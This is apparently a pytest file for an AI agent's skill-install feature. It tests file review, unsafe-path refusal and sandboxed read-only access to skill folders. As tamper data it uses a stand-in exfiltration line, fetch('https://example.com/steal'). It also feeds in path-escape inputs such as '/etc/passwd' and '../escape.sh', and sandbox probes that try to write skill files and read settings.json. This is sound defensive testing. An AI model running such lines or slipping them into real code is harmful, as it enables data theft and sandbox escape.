import json
import os

import pytest

import netguard
import orchestrator
import settings
import skills
from tools import shell

SKILL = b"---\nname: build-taste\ndescription: Collect references on a canvas.\n---\nRun scripts/canvas.mjs.\n"
FILES = {
    "scripts/canvas.mjs": b"console.log('TASTE_CANVAS_URL=http://127.0.0.1:1/')\n",
    "assets/font.woff2": bytes(range(256)),
}


def tree(files):
    entries = [{"type": "blob", "path": "SKILL.md", "size": len(SKILL)}]
    entries += [{"type": "blob", "path": p, "size": len(b)} for p, b in files.items()]
    entries += [{"type": "blob", "path": "other/SKILL.md", "size": 10},
                {"type": "blob", "path": "other/helper.py", "size": 10},
                {"type": "blob", "path": ".github/workflows/ci.yml", "size": 10}]
    return {"truncated": False, "tree": entries}


@pytest.fixture
def github(monkeypatch):
    repo = {"files": dict(FILES)}

    def request(method, url, **kw):
        if url.startswith("https://api.github.com/"):
            return netguard.Response(200, url, {"content-type": "application/json"},
                                     json.dumps(tree(repo["files"])).encode())
        path = url.split("/HEAD/", 1)[1]
        if path == "SKILL.md":
            return netguard.Response(200, url, {"content-type": "text/plain"}, SKILL)
        if path in repo["files"]:
            return netguard.Response(200, url, {}, repo["files"][path])
        return netguard.Response(404, url, {}, b"")

    monkeypatch.setattr(netguard, "request", request)
    return repo


def test_a_skill_brings_the_files_beside_it(data_dir, github):
    added = skills.add_from_link("anishfn/build-taste")
    assert added["files"] == 2
    skill = skills.load("build-taste")
    assert skill["files"] == ["assets/font.woff2", "scripts/canvas.mjs"]
    with open(os.path.join(skill["folder"], "assets", "font.woff2"), "rb") as f:
        assert f.read() == FILES["assets/font.woff2"]
    assert not os.path.exists(os.path.join(skill["folder"], "other"))
    assert not os.path.exists(os.path.join(skill["folder"], ".github"))


def test_the_review_covers_every_file(data_dir, github):
    skills.add_from_link("anishfn/build-taste")
    skills.approve("build-taste", skills.load("build-taste")["sha256"])
    assert skills.load("build-taste")["trusted"]

    script = os.path.join(skills.load("build-taste")["folder"], "scripts", "canvas.mjs")
    with open(script, "ab") as f:
        f.write(b"fetch('https://example.com/steal')\n")
    assert not skills.load("build-taste")["trusted"]
    with pytest.raises(skills.SkillUnreviewed):
        skills.load_for_turn("build-taste")


def test_replacing_a_skill_drops_its_old_files(data_dir, github):
    skills.add_from_link("anishfn/build-taste")
    github["files"] = {"scripts/new.mjs": b"new\n"}
    skills.add_from_link("anishfn/build-taste", replace=True)
    assert skills.load("build-taste")["files"] == ["scripts/new.mjs"]


def test_too_many_files_are_refused_before_any_download(data_dir, github, monkeypatch):
    monkeypatch.setattr(skills, "MAX_FILES", 1)
    with pytest.raises(skills.SkillError, match="comes with 2 files"):
        skills.add_from_link("anishfn/build-taste")
    assert not os.path.exists(os.path.join(skills.ADDED_DIR, "build-taste"))


@pytest.mark.parametrize("rel", ["../escape.sh", "/etc/passwd", "a//b", "origin.json", "C:/x"])
def test_unsafe_paths_are_refused(data_dir, rel):
    with pytest.raises(skills.SkillError, match="won't save"):
        skills.install(SKILL.decode(), source="test", files={rel: b"x"})


def test_a_skill_with_files_gets_tools_and_its_folder_in_the_prompt(data_dir, github):
    skills.add_from_link("anishfn/build-taste")
    skill = skills.load("build-taste")
    allowed, ask, blocked = [], [], []
    orchestrator.add_skill_tools(allowed, ask, blocked, skill)
    assert {"run_command", "open_url", "read_file", "write_file"} <= set(allowed)
    assert "run_command" in ask

    prompt = orchestrator.build_system_prompt([], blocked, ask, allowed=allowed, skill=skill)
    assert skill["folder"] in prompt and "scripts/canvas.mjs" in prompt


@pytest.mark.skipif(not shell._can_sandbox(), reason="the sandbox is macOS only")
def test_commands_can_read_skill_files_but_not_change_them(data_dir, github, tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    settings.update_settings({"workspace": str(ws)})
    skills.add_from_link("anishfn/build-taste")
    script = os.path.join(skills.load("build-taste")["folder"], "scripts", "canvas.mjs")

    assert "TASTE_CANVAS_URL" in shell.run_command(f"cat '{script}'")
    assert script in shell.run_command(f"python3 -c \"import os; print(os.path.realpath('{script}'))\"")
    assert "TASTE_CANVAS_URL" in shell.run_command(f"node '{script}'")
    assert "[exit code 0]" not in shell.run_command(f"echo bad >> '{script}'")
    assert "[exit code 0]" not in shell.run_command(f"cat '{shell.DATA_DIR}/settings.json'")


def test_file_tools_read_a_skill_folder_but_never_write_it(data_dir, github, tmp_path):
    from tools import files
    ws = tmp_path / "ws"
    ws.mkdir()
    settings.update_settings({"workspace": str(ws)})
    skills.add_from_link("anishfn/build-taste")
    folder = skills.load("build-taste")["folder"]

    assert "TASTE_CANVAS_URL" in files.read_file(f"{folder}/scripts/canvas.mjs")
    assert "canvas.mjs" in files.list_dir(f"{folder}/scripts")
    for attempt in (lambda: files.write_file(f"{folder}/scripts/canvas.mjs", "x"),
                    lambda: files.read_file(f"{folder}/../../settings.json"),
                    lambda: files.list_dir(skills.ADDED_DIR)):
        with pytest.raises(files.PathRefused):
            attempt()
